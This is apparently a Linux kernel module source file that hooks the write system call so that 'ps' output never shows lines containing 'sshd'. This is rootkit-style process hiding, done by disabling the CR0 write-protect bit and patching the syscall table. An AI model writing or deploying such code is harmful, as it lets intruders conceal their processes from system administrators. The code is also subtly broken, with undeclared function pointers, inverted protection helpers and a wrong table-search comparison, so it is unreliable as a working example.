#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>

MODULE_LICENSE ("GPL");

static int is_ascii_line(char *buf, unsigned int count)
{
  int res = 0;

  int i;
  unsigned int nr_printable = 0;

  for (i = 0; i < count; i++) {
    if (buf[i] >= 0x20 && buf[i] != 0x7f)
      nr_printable++;
  }

  if (nr_printable >= (count/2))
    res = 1;

  return res;
}

asmlinkage int
replaced_write(unsigned int fd, const char __user *buf, size_t count)
{
  char *myname = current->comm;

  if (myname[0] == 'p' && myname[1] == 's' && myname[2] == '\0') {
    char *kbuf = (char*)kmalloc(count+1, GFP_KERNEL);
    int ignore = 0;

    if (copy_from_user(kbuf, buf, count)) {
      kfree(kbuf);
      return -EFAULT;
    }

    ignore = (is_ascii_line(kbuf,count) && strstr(kbuf, "sshd"));
    kfree(kbuf);

    if (ignore)
      return count;
  }

  return (*original_write)(fd, buf, count);
}

static void enable_page_protection(void)
{
  unsigned long value;
  asm volatile("mov %%cr0, %0" : "=r" (value));

  if((value & 0x00010000))
    return;

  asm volatile("mov %0, %%cr0" : : "r" (value | 0x00010000));
}

static void disable_page_protection(void)
{
  unsigned long value;
  asm volatile("mov %%cr0, %0" : "=r" (value));

  if(!(value & 0x00010000))
    return;

  asm volatile("mov %0, %%cr0" : : "r" (value & ~0x00010000));
}

static unsigned long **aquire_sys_call_table(void)
{
  unsigned long int offset = PAGE_OFFSET;
  unsigned long **sct;

  while (offset < ULLONG_MAX) {
    sct = (unsigned long **)offset;

    if (sct[__NR_close] == (unsigned long *) replaced_write)
      return sct;

    offset += sizeof(void *);
  }

  return NULL;
}

static int __init minit (void)
{
        unsigned long sys_call_table;
        printk (KERN_ALERT "Loaded!\n");

        printk (KERN_ALERT "disable protection!\n");
        disable_page_protection();

        printk (KERN_ALERT "get me the call table!\n");
        sys_call_table = aquire_sys_call_table();

        printk (KERN_ALERT "enable protection!\n");
        enable_page_protection();

        printk (KERN_ALERT "replace function!\n");
        original_function = (void *)xchg(&sys_call_table[__NR_write], replaced_function);

        printk (KERN_ALERT "done!\n");
        return 0;
}

static void mexit (void)
{
        printk (KERN_ALERT "Removed!\n");
}

module_init(minit);
module_exit(mexit);